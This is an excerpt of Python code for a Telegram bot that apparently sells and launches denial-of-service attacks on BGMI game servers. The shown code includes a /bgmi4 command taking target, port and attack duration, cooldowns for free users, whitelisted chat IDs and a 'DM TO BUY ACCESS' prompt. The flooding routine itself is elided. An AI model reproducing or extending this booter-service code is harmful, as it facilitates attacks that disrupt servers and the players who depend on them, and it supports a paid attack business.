...
allowed_user_ids = read_users() + ["-1002182851898", "-1002214579435", "-1002157846378"]
...
# Function to handle the reply when free users run the /bgmi4 command
...
# Dictionary to store the last time each user ran the /bgmi4 command
bgmi4_cooldown = {}
...
def start_attack(user_id, target, port, time):
    ...
    try:
        ...
        response = f"ᴇɴᴢᴏʏ ʙʀᴏᴛʜᴇʀ ❤️. Target: {target} Port: {port} Time: {time} 200"
...
def run_attack_and_notify(message, user_id, target, port, time):
    ...
    if success:
        bot.reply_to(message, "ʏᴏᴜʀ ᴘʀᴇᴠɪᴏᴜs ᴀᴛᴛᴀᴄᴋ ɪs ғɪɴɪsʜᴇᴅ ⏤͟͟͞͞★")
        
        # Creating inline keyboard button
        ...
        bot.send_message(
            message.chat.id, 
            "sʜᴀʀᴇ ʏᴏᴜʀ ғᴇᴇᴅʙᴀᴄᴋ ᴏғ ᴇᴠᴇʀʏ ᴀᴛᴛᴀᴄᴋ ɪs ᴄᴏᴍᴘᴜʟsᴏʀʏ", 
            reply_markup=markup
        )

# Handler for /11 command
@bot.message_handler(commands=['bgmi4'])
def handle_bgmi4(message):
    user_id = str(message.chat.id)
    ...
    if user_id in allowed_user_ids:
        ...
        if user_id not in admin_id:
            ...
            if user_id in bgmi4_cooldown and (datetime.datetime.now() - bgmi4_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "You Are On Cooldown ❌. Please Wait 10sec Before Running The /bgmi4 Command Again."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi4_cooldown[user_id] = datetime.datetime.now()
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 130:
                response = "Error: Time interval must be less than 130."
            else:
                record_command_logs(user_id, '/bgmi4', target, port, time)
            ...
            response = "✅ Usage :- /bgmi4 <target> <port> <time>"  # Updated command syntax
    else:
        response = "🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /bgmi4 command. DM TO BUY ACCESS:- @WynkMusicRobot"
...
💥 /bgmi4 : Method For bgmi4 Servers. 
